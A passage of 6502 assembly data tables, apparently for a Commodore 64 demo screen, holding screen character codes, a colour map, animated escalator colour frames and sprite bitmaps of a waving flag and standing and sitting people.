	.byte $a0,$a0,$a0,$a0,$a0,$88,$8f,$8b,$95,$94,$8f,$a0,$86,$8f,$92,$83
	.byte $85,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$dd,$e3,$dd,$bd,$dd
	.byte $af,$dd,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0
	.byte $a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0
	.byte $a0,$a0,$a0,$dd,$af,$dd,$bd,$dd,$c3,$cb,$a0,$a0,$a0,$a0,$a0,$a0
	.byte $a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0
	.byte $a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$ca,$c3,$cb,$62,$ca
	.byte $e2,$e2,$e2,$57,$e2,$e2,$57,$e2,$e2,$e2,$e2,$e2,$e2,$e2,$e2,$e2
	.byte $e2,$e2,$e2,$e2,$e2,$e2,$e2,$e2,$e2,$e2,$e2,$e2,$e2,$e2,$57,$e2
	.byte $e2,$57,$e2,$e2,$e2,$e2,$20,$e2,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4
	.byte $c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4
	.byte $c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4
	.byte $df,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce
	.byte $ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce
	.byte $ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$cd,$df,$20,$20,$20,$20,$20,$20
	.byte $20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20
	.byte $20,$20,$20,$20,$20,$20,$20,$20,$62,$62,$62,$62,$62,$62,$62,$20
	.byte $62,$cd,$df,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20
	.byte $20,$20,$20,$20,$f0,$c0,$ee,$20,$20,$20,$20,$20,$20,$20,$20,$20
	.byte $94,$89,$83,$8b,$85,$94,$93,$20,$62,$62,$cd,$df,$20,$20,$20,$20
	.byte $20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$dd,$bd,$dd,$20
	.byte $20,$20,$20,$20,$20,$20,$20,$20,$f5,$f4,$a0,$a0,$a0,$ea,$f6,$20
	.byte $62,$62,$62,$cd,$df,$20,$20,$20,$20,$20,$20,$20,$20,$20,$f8,$f8
	.byte $f8,$f8,$f8,$20,$dd,$bd,$dd,$20,$f8,$f8,$f8,$f8,$f8,$20,$20,$20
	.byte $f5,$f4,$20,$79,$20,$ea,$f6,$20,$62,$62,$62,$62,$cd,$df,$20,$20
	.byte $20,$20,$20,$20,$20,$6c,$c6,$c6,$c6,$c6,$c6,$7b,$ed,$c0,$fd,$6c
	.byte $c6,$c6,$c6,$c6,$c6,$7b,$20,$20,$f5,$f4,$20,$a2,$20,$ea,$f6,$20
	.byte $62,$62,$62,$62,$62,$cd,$df,$20,$20,$20,$20,$20,$20,$76,$63,$63
	.byte $63,$63,$63,$75,$20,$42,$20,$76,$63,$63,$63,$63,$63,$75,$20,$20
	.byte $f5,$f4,$cf,$e3,$d0,$ea,$f6,$20,$a0,$62,$62,$62,$62,$62,$cd,$df
	.byte $20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$71,$20,$20
	.byte $20,$20,$20,$20,$20,$20,$20,$20,$f5,$f4,$f4,$a0,$e7,$ea,$f6,$20
	.byte $cd,$a0,$62,$62,$62,$62,$62,$cd,$df,$20,$20,$20,$20,$20,$20,$20
	.byte $20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20
	.byte $f5,$f4,$f4,$a0,$e7,$e7,$f6,$20,$a0,$cd,$a0,$62,$62,$62,$62,$62
	.byte $cd,$df,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20
	.byte $20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20
	.byte $a0,$a0,$cd,$a0,$62,$62,$62,$62,$62,$cd,$df,$20,$20,$20,$20,$20
	.byte $20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20
	.byte $20,$20,$20,$20,$20,$20,$20,$20,$5f,$a0,$a0,$cd,$a0,$62,$62,$62
	.byte $62,$62,$cd,$df,$20,$20,$e9,$20,$e9,$20,$e9,$20,$e9,$20,$e9,$20
	.byte $e9,$20,$e9,$20,$e9,$20,$20,$20,$20,$20,$20,$79,$79,$20,$20,$20
	.byte $20,$5f,$a0,$a0,$cd,$a0,$62,$62,$62,$62,$62,$cd,$df,$20,$a0,$dd
	.byte $fb,$dd,$a0,$dd,$fb,$dd,$a0,$dd,$fb,$dd,$a0,$dd,$fb,$20,$20,$20
	.byte $20,$20,$20,$a0,$d1,$20,$20,$20,$20,$20,$5f,$a0,$a0,$cd,$a0,$62
	.byte $62,$62,$62,$62,$cd,$df,$a0,$dd,$a0,$dd,$a0,$dd,$a0,$dd,$a0,$dd
	.byte $a0,$dd,$a0,$dd,$a0,$20,$20,$20,$20,$20,$20,$a0,$a0,$20,$20,$20
	.byte $20,$20,$20,$5f,$a0,$a0,$cd,$a0,$62,$62,$62,$62,$62,$cd,$a0,$20
	.byte $a0,$20,$a0,$20,$a0,$20,$a0,$20,$a0,$20,$a0,$20,$a0,$20,$20,$20
	.byte $20,$20,$20,$e1,$61,$20,$20,$20

; Background screen color data (1000 bytes)
colors:
    .byte $0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b
	.byte $0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b
	.byte $0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$02,$02,$02,$02,$02,$02,$02,$02
	.byte $02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02
	.byte $02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02
	.byte $02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02
	.byte $02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02
	.byte $02,$02,$02,$02,$02,$02,$02,$02,$0c,$02,$02,$02,$07,$02,$02,$0c
	.byte $02,$02,$07,$02,$02,$07,$02,$02,$0c,$02,$02,$07,$02,$02,$07,$02
	.byte $02,$07,$02,$02,$07,$02,$02,$0c,$02,$02,$02,$02,$0c,$02,$0b,$02
	.byte $0c,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02
	.byte $02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02
	.byte $02,$02,$02,$02,$0c,$02,$0b,$02,$0c,$02,$02,$02,$02,$02,$02,$02
	.byte $02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02
	.byte $02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$0c,$02,$0b,$02
	.byte $0c,$02,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$02,$02,$02,$02
	.byte $02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$0b,$0b,$0b,$0b,$0b,$0b
	.byte $0b,$0b,$0b,$02,$0c,$02,$0b,$02,$02,$02,$06,$06,$06,$06,$06,$06
	.byte $06,$06,$06,$06,$06,$06,$06,$06,$06,$06,$06,$06,$06,$06,$06,$06
	.byte $06,$06,$06,$06,$06,$06,$06,$06,$06,$06,$06,$02,$02,$02,$0c,$02
	.byte $06,$06,$0b,$0b,$0b,$0b,$0b,$0b,$06,$06,$06,$06,$06,$06,$06,$06
	.byte $06,$06,$06,$06,$06,$06,$06,$06,$06,$06,$06,$06,$06,$0b,$0b,$0b
	.byte $0b,$0b,$0b,$06,$06,$06,$02,$06,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b
	.byte $0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b
	.byte $0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b
	.byte $06,$07,$07,$07,$07,$07,$07,$07,$07,$07,$07,$07,$07,$07,$07,$07
	.byte $07,$07,$07,$07,$07,$07,$07,$07,$07,$07,$07,$07,$07,$07,$07,$07
	.byte $07,$07,$07,$07,$07,$07,$07,$07,$06,$06,$0d,$0d,$0d,$0d,$0d,$0d
	.byte $0d,$0d,$0d,$0d,$0d,$0d,$0d,$0d,$0d,$0d,$0d,$0d,$0d,$0d,$0d,$0d
	.byte $0d,$0d,$0d,$0d,$0d,$0d,$0d,$0d,$0c,$0c,$0c,$0c,$0c,$0c,$0c,$0f
	.byte $03,$06,$06,$0d,$0b,$0b,$0b,$0b,$04,$04,$04,$04,$04,$0b,$0b,$0b
	.byte $0b,$0b,$0b,$0b,$0b,$0c,$0f,$0d,$0d,$0d,$0d,$0d,$0d,$0d,$0d,$0d
	.byte $0d,$0d,$0d,$0d,$0d,$0d,$0d,$0f,$07,$07,$06,$06,$0d,$0b,$0b,$0b
	.byte $04,$04,$04,$04,$04,$0b,$0b,$0b,$0b,$0b,$0b,$0d,$0b,$01,$0f,$0d
	.byte $0d,$0d,$0d,$0d,$0d,$0d,$0d,$0d,$03,$03,$03,$03,$03,$03,$03,$0f
	.byte $05,$05,$05,$06,$06,$0d,$0b,$0b,$0b,$04,$04,$04,$0b,$0b,$08,$08
	.byte $08,$08,$08,$0d,$0b,$01,$0f,$0d,$08,$08,$08,$08,$08,$0d,$0d,$0d
	.byte $03,$03,$0d,$06,$0d,$03,$03,$0f,$04,$04,$04,$04,$06,$06,$0d,$0b
	.byte $0b,$04,$04,$04,$0b,$08,$08,$08,$08,$08,$08,$08,$0b,$0c,$0f,$08
	.byte $08,$08,$08,$08,$08,$08,$0d,$0d,$03,$03,$0d,$0a,$0d,$03,$03,$0f
	.byte $02,$02,$02,$02,$02,$06,$06,$0d,$0b,$04,$04,$0b,$0b,$09,$09,$09
	.byte $09,$09,$09,$09,$0b,$0b,$0b,$09,$09,$09,$09,$09,$09,$09,$0d,$0d
	.byte $0c,$0c,$0c,$0c,$0c,$0c,$0c,$0f,$06,$01,$01,$01,$01,$01,$06,$06
	.byte $0d,$0b,$04,$0b,$0b,$08,$08,$08,$08,$08,$08,$0b,$0b,$0b,$0b,$08
	.byte $08,$08,$08,$08,$08,$08,$0d,$0d,$0c,$0c,$0c,$0c,$0c,$0c,$0c,$0f
	.byte $06,$06,$08,$08,$08,$08,$08,$06,$06,$0d,$0b,$0b,$0b,$08,$08,$08
	.byte $08,$08,$08,$0b,$0b,$0c,$0c,$08,$08,$08,$08,$08,$08,$08,$08,$0f
	.byte $0c,$0c,$0c,$0c,$0c,$0c,$0c,$0f,$06,$06,$06,$09,$09,$09,$09,$09
	.byte $06,$06,$0d,$0b,$0b,$08,$08,$08,$08,$08,$08,$0d,$0b,$0c,$0c,$08
	.byte $08,$08,$08,$08,$08,$08,$0f,$0f,$0f,$0f,$0f,$09,$09,$09,$0d,$0d
	.byte $06,$06,$06,$06,$0a,$0a,$0a,$0a,$0a,$06,$06,$0d,$0b,$0f,$0f,$0f
	.byte $0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$08,$0f
	.byte $0f,$0f,$0d,$09,$09,$09,$0d,$0d,$06,$06,$06,$06,$06,$0d,$0d,$0d
	.byte $0d,$0d,$06,$06,$0b,$09,$0c,$03,$0f,$0f,$0c,$0f,$0f,$0f,$0c,$0f
	.byte $0f,$0f,$0c,$0f,$0f,$0f,$08,$08,$08,$08,$0f,$09,$08,$06,$0d,$0d
	.byte $04,$06,$06,$06,$06,$06,$0e,$0e,$0e,$0e,$0e,$06,$06,$09,$0f,$03
	.byte $0f,$03,$0f,$03,$0f,$03,$0f,$03,$0f,$03,$0f,$03,$0f,$0f,$08,$08
	.byte $08,$08,$0d,$0b,$0c,$06,$0d,$0d,$04,$04,$06,$06,$06,$06,$06,$0f
	.byte $0f,$0f,$0f,$0f,$06,$06,$0f,$03,$0f,$03,$0f,$03,$0f,$03,$0f,$03
	.byte $0f,$03,$0f,$03,$0f,$0f,$08,$08,$08,$08,$0d,$0b,$0c,$06,$0d,$0d
	.byte $04,$04,$04,$06,$06,$06,$06,$06,$0c,$0c,$0c,$0c,$0c,$06,$0f,$0f
	.byte $0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$08,$08
	.byte $08,$08,$0d,$0b,$0f,$06,$0d,$0d

escalator_1:
        .byte $03,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $07,$07,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $05,$05,$05,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $04,$04,$04,$04,$06,$06,$00,$00,$00,$00,$00,$00,$00
        .byte $02,$02,$02,$02,$02,$06,$06,$00,$00,$00,$00,$00,$00
        .byte $06,$01,$01,$01,$01,$01,$06,$06,$00,$00,$00,$00,$00
        .byte $06,$06,$08,$08,$08,$08,$08,$06,$06,$00,$00,$00,$00
        .byte $06,$06,$06,$09,$09,$09,$09,$09,$06,$06,$00,$00,$00
        .byte $06,$06,$06,$06,$0a,$0a,$0a,$0a,$0a,$06,$06,$00,$00
        .byte $06,$06,$06,$06,$06,$0d,$0d,$0d,$0d,$0d,$06,$06,$00
        .byte $00,$06,$06,$06,$06,$06,$0e,$0e,$0e,$0e,$0e,$06,$06
        .byte $00,$00,$06,$06,$06,$06,$06,$0f,$0f,$0f,$0f,$0f,$06
        .byte $00,$00,$00,$06,$06,$06,$06,$06,$0c,$0c,$0c,$0c,$0c

escalator_2:
        .byte $0c,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $03,$03,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $07,$07,$07,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $05,$05,$05,$05,$06,$06,$00,$00,$00,$00,$00,$00,$00
        .byte $04,$04,$04,$04,$04,$06,$06,$00,$00,$00,$00,$00,$00
        .byte $06,$02,$02,$02,$02,$02,$06,$06,$00,$00,$00,$00,$00
        .byte $06,$06,$01,$01,$01,$01,$01,$06,$06,$00,$00,$00,$00
        .byte $06,$06,$06,$08,$08,$08,$08,$08,$06,$06,$00,$00,$00
        .byte $06,$06,$06,$06,$09,$09,$09,$09,$09,$06,$06,$00,$00
        .byte $06,$06,$06,$06,$06,$0a,$0a,$0a,$0a,$0a,$06,$06,$00
        .byte $00,$06,$06,$06,$06,$06,$0d,$0d,$0d,$0d,$0d,$06,$06
        .byte $00,$00,$06,$06,$06,$06,$06,$0e,$0e,$0e,$0e,$0e,$06
        .byte $00,$00,$00,$06,$06,$06,$06,$06,$0f,$0f,$0f,$0f,$0f

escalator_3:
        .byte $0f,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0c,$0c,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $03,$03,$03,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $07,$07,$07,$07,$06,$06,$00,$00,$00,$00,$00,$00,$00
        .byte $05,$05,$05,$05,$05,$06,$06,$00,$00,$00,$00,$00,$00
        .byte $06,$04,$04,$04,$04,$04,$06,$06,$00,$00,$00,$00,$00
        .byte $06,$06,$02,$02,$02,$02,$02,$06,$06,$00,$00,$00,$00
        .byte $06,$06,$06,$01,$01,$01,$01,$01,$06,$06,$00,$00,$00
        .byte $06,$06,$06,$06,$08,$08,$08,$08,$08,$06,$06,$00,$00
        .byte $06,$06,$06,$06,$06,$09,$09,$09,$09,$09,$06,$06,$00
        .byte $00,$06,$06,$06,$06,$06,$0a,$0a,$0a,$0a,$0a,$06,$06
        .byte $00,$00,$06,$06,$06,$06,$06,$0d,$0d,$0d,$0d,$0d,$06
        .byte $00,$00,$00,$06,$06,$06,$06,$06,$0e,$0e,$0e,$0e,$0e

escalator_4:
        .byte $0e,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0f,$0f,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0c,$0c,$0c,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $03,$03,$03,$03,$06,$06,$00,$00,$00,$00,$00,$00,$00
        .byte $07,$07,$07,$07,$07,$06,$06,$00,$00,$00,$00,$00,$00
        .byte $06,$05,$05,$05,$05,$05,$06,$06,$00,$00,$00,$00,$00
        .byte $06,$06,$04,$04,$04,$04,$04,$06,$06,$00,$00,$00,$00
        .byte $06,$06,$06,$02,$02,$02,$02,$02,$06,$06,$00,$00,$00
        .byte $06,$06,$06,$06,$01,$01,$01,$01,$01,$06,$06,$00,$00
        .byte $06,$06,$06,$06,$06,$08,$08,$08,$08,$08,$06,$06,$00
        .byte $00,$06,$06,$06,$06,$06,$09,$09,$09,$09,$09,$06,$06
        .byte $00,$00,$06,$06,$06,$06,$06,$0a,$0a,$0a,$0a,$0a,$06
        .byte $00,$00,$00,$06,$06,$06,$06,$06,$0d,$0d,$0d,$0d,$0d

escalator_5:
        .byte $0d,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0e,$0e,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0f,$0f,$0f,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0c,$0c,$0c,$0c,$06,$06,$00,$00,$00,$00,$00,$00,$00
        .byte $03,$03,$03,$03,$03,$06,$06,$00,$00,$00,$00,$00,$00
        .byte $06,$07,$07,$07,$07,$07,$06,$06,$00,$00,$00,$00,$00
        .byte $06,$06,$05,$05,$05,$05,$05,$06,$06,$00,$00,$00,$00
        .byte $06,$06,$06,$04,$04,$04,$04,$04,$06,$06,$00,$00,$00
        .byte $06,$06,$06,$06,$02,$02,$02,$02,$02,$06,$06,$00,$00
        .byte $06,$06,$06,$06,$06,$01,$01,$01,$01,$01,$06,$06,$00
        .byte $00,$06,$06,$06,$06,$06,$08,$08,$08,$08,$08,$06,$06
        .byte $00,$00,$06,$06,$06,$06,$06,$09,$09,$09,$09,$09,$06
        .byte $00,$00,$00,$06,$06,$06,$06,$06,$0a,$0a,$0a,$0a,$0a

escalator_6:
        .byte $0a,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0d,$0d,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0e,$0e,$0e,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0f,$0f,$0f,$0f,$06,$06,$00,$00,$00,$00,$00,$00,$00
        .byte $0c,$0c,$0c,$0c,$0c,$06,$06,$00,$00,$00,$00,$00,$00
        .byte $06,$03,$03,$03,$03,$03,$06,$06,$00,$00,$00,$00,$00
        .byte $06,$06,$07,$07,$07,$07,$07,$06,$06,$00,$00,$00,$00
        .byte $06,$06,$06,$05,$05,$05,$05,$05,$06,$06,$00,$00,$00
        .byte $06,$06,$06,$06,$04,$04,$04,$04,$04,$06,$06,$00,$00
        .byte $06,$06,$06,$06,$06,$02,$02,$02,$02,$02,$06,$06,$00
        .byte $00,$06,$06,$06,$06,$06,$01,$01,$01,$01,$01,$06,$06
        .byte $00,$00,$06,$06,$06,$06,$06,$08,$08,$08,$08,$08,$06
        .byte $00,$00,$00,$06,$06,$06,$06,$06,$09,$09,$09,$09,$09

escalator_7:
        .byte $09,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0a,$0a,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0d,$0d,$0d,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0e,$0e,$0e,$0e,$06,$06,$00,$00,$00,$00,$00,$00,$00
        .byte $0f,$0f,$0f,$0f,$0f,$06,$06,$00,$00,$00,$00,$00,$00
        .byte $06,$0c,$0c,$0c,$0c,$0c,$06,$06,$00,$00,$00,$00,$00
        .byte $06,$06,$03,$03,$03,$03,$03,$06,$06,$00,$00,$00,$00
        .byte $06,$06,$06,$07,$07,$07,$07,$07,$06,$06,$00,$00,$00
        .byte $06,$06,$06,$06,$05,$05,$05,$05,$05,$06,$06,$00,$00
        .byte $06,$06,$06,$06,$06,$04,$04,$04,$04,$04,$06,$06,$00
        .byte $00,$06,$06,$06,$06,$06,$02,$02,$02,$02,$02,$06,$06
        .byte $00,$00,$06,$06,$06,$06,$06,$01,$01,$01,$01,$01,$06
        .byte $00,$00,$00,$06,$06,$06,$06,$06,$08,$08,$08,$08,$08

escalator_8:
        .byte $08,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $09,$09,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0a,$0a,$0a,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0d,$0d,$0d,$0d,$06,$06,$00,$00,$00,$00,$00,$00,$00
        .byte $0e,$0e,$0e,$0e,$0e,$06,$06,$00,$00,$00,$00,$00,$00
        .byte $06,$0f,$0f,$0f,$0f,$0f,$06,$06,$00,$00,$00,$00,$00
        .byte $06,$06,$0c,$0c,$0c,$0c,$0c,$06,$06,$00,$00,$00,$00
        .byte $06,$06,$06,$03,$03,$03,$03,$03,$06,$06,$00,$00,$00
        .byte $06,$06,$06,$06,$07,$07,$07,$07,$07,$06,$06,$00,$00
        .byte $06,$06,$06,$06,$06,$05,$05,$05,$05,$05,$06,$06,$00
        .byte $00,$06,$06,$06,$06,$06,$04,$04,$04,$04,$04,$06,$06
        .byte $00,$00,$06,$06,$06,$06,$06,$02,$02,$02,$02,$02,$06
        .byte $00,$00,$00,$06,$06,$06,$06,$06,$01,$01,$01,$01,$01

escalator_9:
        .byte $01,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $08,$08,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $09,$09,$09,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $0a,$0a,$0a,$0a,$06,$06,$00,$00,$00,$00,$00,$00,$00
        .byte $0d,$0d,$0d,$0d,$0d,$06,$06,$00,$00,$00,$00,$00,$00
        .byte $06,$0e,$0e,$0e,$0e,$0e,$06,$06,$00,$00,$00,$00,$00
        .byte $06,$06,$0f,$0f,$0f,$0f,$0f,$06,$06,$00,$00,$00,$00
        .byte $06,$06,$06,$0c,$0c,$0c,$0c,$0c,$06,$06,$00,$00,$00
        .byte $06,$06,$06,$06,$03,$03,$03,$03,$03,$06,$06,$00,$00
        .byte $06,$06,$06,$06,$06,$07,$07,$07,$07,$07,$06,$06,$00
        .byte $00,$06,$06,$06,$06,$06,$05,$05,$05,$05,$05,$06,$06
        .byte $00,$00,$06,$06,$06,$06,$06,$04,$04,$04,$04,$04,$06
        .byte $00,$00,$00,$06,$06,$06,$06,$06,$02,$02,$02,$02,$02

escalator_10:
        .byte $02,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $01,$01,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $08,$08,$08,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $09,$09,$09,$09,$06,$06,$00,$00,$00,$00,$00,$00,$00
        .byte $0a,$0a,$0a,$0a,$0a,$06,$06,$00,$00,$00,$00,$00,$00
        .byte $06,$0d,$0d,$0d,$0d,$0d,$06,$06,$00,$00,$00,$00,$00
        .byte $06,$06,$0e,$0e,$0e,$0e,$0e,$06,$06,$00,$00,$00,$00
        .byte $06,$06,$06,$0f,$0f,$0f,$0f,$0f,$06,$06,$00,$00,$00
        .byte $06,$06,$06,$06,$0c,$0c,$0c,$0c,$0c,$06,$06,$00,$00
        .byte $06,$06,$06,$06,$06,$03,$03,$03,$03,$03,$06,$06,$00
        .byte $00,$06,$06,$06,$06,$06,$07,$07,$07,$07,$07,$06,$06
        .byte $00,$00,$06,$06,$06,$06,$06,$05,$05,$05,$05,$05,$06
        .byte $00,$00,$00,$06,$06,$06,$06,$06,$04,$04,$04,$04,$04


; Sprite data (63 bytes)
; flag
sprite0_data:
    	.byte 0,0,0,0,0,0,0,0,0,8,0,0,10,0,32,11
    	.byte 128,160,11,170,160,11,170,160,10,170,160,10,170,160,10,170
    	.byte 160,10,170,160,6,170,160,4,170,128,4,42,0,4,0,0
    	.byte 4,0,0,4,0,0,4,0,0,4,0,0,4,0,0

sprite1_data:
    	.byte 0,0,0,0,0,0,0,0,0,10,0,0,10,128,0,10
    	.byte 224,32,10,234,160,10,234,160,10,234,160,10,170,160,10,170
    	.byte 160,10,170,160,4,170,160,4,42,160,4,10,128,4,0,0
    	.byte 4,0,0,4,0,0,4,0,0,4,0,0,4,0,0

sprite2_data:
    	.byte 0,0,0,0,0,0,0,0,0,10,128,0,10,176,0,10
    	.byte 248,0,10,250,160,10,250,160,10,186,160,10,170,160,10,170
    	.byte 160,10,170,160,4,42,160,4,10,160,4,2,160,4,0,0
    	.byte 4,0,0,4,0,0,4,0,0,4,0,0,4,0,0

sprite3_data:
    	.byte 0,0,0,0,0,0,2,160,0,10,188,0,10,190,0,10
    	.byte 190,160,10,190,160,10,186,160,10,170,160,10,170,160,10,170
    	.byte 160,8,10,160,4,2,160,4,0,160,4,0,0,4,0,0
    	.byte 4,0,0,4,0,0,4,0,0,4,0,0,4,0,0

sprite4_data:
    	.byte 0,0,0,0,168,0,2,174,0,10,190,128,10,190,160,10
    	.byte 190,160,10,190,160,10,174,160,10,170,160,10,170,160,10,2
    	.byte 160,8,0,160,4,0,32,4,0,0,4,0,0,4,0,0
    	.byte 4,0,0,4,0,0,4,0,0,4,0,0,4,0,0

sprite5_data:
    	.byte 0,42,0,0,175,128,2,175,160,10,175,160,10,175,160,10
    	.byte 175,160,10,175,160,10,171,160,10,170,160,10,128,160,10,0
    	.byte 32,8,0,0,4,0,0,4,0,0,4,0,0,4,0,0
    	.byte 4,0,0,4,0,0,4,0,0,4,0,0,4,0,0

sprite6_data:
    	.byte 0,10,128,0,42,224,0,170,224,10,170,224,10,170,224,10
    	.byte 170,224,10,170,160,10,170,160,10,170,160,10,160,32,10,128
    	.byte 0,10,0,0,4,0,0,4,0,0,4,0,0,4,0,0
    	.byte 4,0,0,4,0,0,4,0,0,4,0,0,4,0,0

sprite7_data:
    	.byte 0,2,160,0,10,160,0,42,160,10,170,160,10,170,160,10
    	.byte 170,160,10,170,160,10,170,160,10,170,160,10,168,0,10,160
    	.byte 0,10,128,0,4,0,0,4,0,0,4,0,0,4,0,0
    	.byte 4,0,0,4,0,0,4,0,0,4,0,0,4,0,0

sprite8_data:
        .byte 0,0,0,0,0,160,0,2,160,8,10,160,10,170,160,10
        .byte 170,160,10,170,160,10,170,160,10,170,160,10,170,160,10,170
        .byte 0,10,168,0,6,160,0,4,0,0,4,0,0,4,0,0
        .byte 4,0,0,4,0,0,4,0,0,4,0,0,4,0,0

sprite9_data:
        .byte 0,0,0,0,0,0,0,0,32,8,0,160,10,2,160,10
        .byte 170,160,10,170,160,10,170,160,10,170,160,10,170,160,10,170
        .byte 160,10,170,128,6,170,0,4,168,0,4,0,0,4,0,0
        .byte 4,0,0,4,0,0,4,0,0,4,0,0,4,0,0



; standing person
sprite10_data:
    	.byte 0,60,0,0,126,0,0,126,0,0,126,0,0,60,0,0
    	.byte 0,0,0,255,0,1,255,128,1,255,128,1,255,128,0,126
    	.byte 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
    	.byte 0,231,0,0,0,0,0,0,0,0,0,0,0,0,0

sprite11_data:
    	.byte 0,0,0,0,0,0,0,0,0,0,0,0,0,66,0,0
    	.byte 60,0,0,0,0,0,0,0,0,0,0,0,0,0,1,129
    	.byte 128,1,129,128,0,0,0,0,0,0,0,0,0,0,0,0
    	.byte 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0

sprite12_data:
    	.byte 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
    	.byte 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
    	.byte 0,0,126,0,0,126,0,0,102,0,0,102,0,0,102,0
    	.byte 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0

; sitting person
sprite13_data:
    	.byte 0,60,0,0,126,0,0,66,0,0,66,0,0,0,0,0
    	.byte 0,0,0,255,0,1,255,128,1,255,128,1,189,128,1,189
    	.byte 128,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
    	.byte 1,195,128,0,0,0,0,0,0,0,0,0,0,0,0

sprite14_data:
    	.byte 0,0,0,0,0,0,0,24,0,0,60,0,0,126,0,0
    	.byte 60,0,0,0,0,0,0,0,0,0,0,0,66,0,0,66
    	.byte 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
    	.byte 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0

sprite15_data:
    	.byte 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
